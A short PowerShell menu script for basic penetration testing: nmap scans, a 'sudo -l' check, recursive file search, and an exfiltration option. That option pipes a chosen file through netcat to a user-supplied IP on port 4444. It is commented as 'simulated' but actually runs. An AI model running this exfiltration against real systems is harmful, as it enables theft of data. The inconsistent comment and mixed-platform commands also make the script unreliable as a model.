# Basic Pentester Tools Script
# A simple menu-driven interface for basic pentesting tasks

function Show-Menu {
    Clear-Host
    Write-Host "==========================================="
    Write-Host "      Basic Pentester Tools Menu"
    Write-Host "==========================================="
    Write-Host "1. Reconnaissance"
    Write-Host "2. Enumeration"
    Write-Host "3. Privilege Escalation"
    Write-Host "4. File Searching"
    Write-Host "5. Data Exfiltration"
    Write-Host "6. Exit"
    Write-Host "==========================================="
    Write-Host "Please select an option (1-6):"
}

function Perform-Reconnaissance {
    Clear-Host
    Write-Host "Starting Reconnaissance..."
    $ip = Read-Host "Enter the target IP address for reconnaissance"
    Write-Host "Running basic Nmap scan on $ip..."
    nmap -A $ip
    Write-Host "Reconnaissance completed."
    Pause
}

function Perform-Enumeration {
    Clear-Host
    Write-Host "Starting Enumeration..."
    $target = Read-Host "Enter target IP address or hostname"
    Write-Host "Running service enumeration on $target..."
    nmap -sV $target
    Write-Host "Enumeration completed."
    Pause
}

function Perform-PrivilegeEscalation {
    Clear-Host
    Write-Host "Starting Privilege Escalation Check..."
    Write-Host "Checking for sudo permissions..."
    sudo -l
    Write-Host "Privilege escalation check completed."
    Pause
}

function Perform-FileSearching {
    Clear-Host
    Write-Host "Starting File Searching..."
    $dir = Read-Host "Enter directory to search (e.g., C:\ or /etc)"
    $fileType = Read-Host "Enter file type to search for (e.g., *.txt, *.conf)"
    Write-Host "Searching for $fileType in $dir..."
    Get-ChildItem -Path $dir -Recurse -Filter $fileType
    Write-Host "File search completed."
    Pause
}

function Perform-Exfiltration {
    Clear-Host
    Write-Host "Starting Data Exfiltration..."
    $filePath = Read-Host "Enter the path of the file to exfiltrate"
    $destinationIP = Read-Host "Enter the destination IP address"
    Write-Host "Exfiltrating file $filePath to $destinationIP..."
    # Simulated file transfer using Netcat (nc)
    cmd /c "nc $destinationIP 4444 < $filePath"
    Write-Host "Data exfiltration completed."
    Pause
}

# Main Program Loop
do {
    Show-Menu
    $choice = Read-Host "Select an option (1-6)"
    
    if ($choice -eq '1') {
        Perform-Reconnaissance
    }
    elseif ($choice -eq '2') {
        Perform-Enumeration
    }
    elseif ($choice -eq '3') {
        Perform-PrivilegeEscalation
    }
    elseif ($choice -eq '4') {
        Perform-FileSearching
    }
    elseif ($choice -eq '5') {
        Perform-Exfiltration
    }
    elseif ($choice -eq '6') {
        Write-Host "Exiting..."; break
    }
    else {
        Write-Host "Invalid option, please choose a number between 1 and 6."
    }
} while ($choice -ne '6')
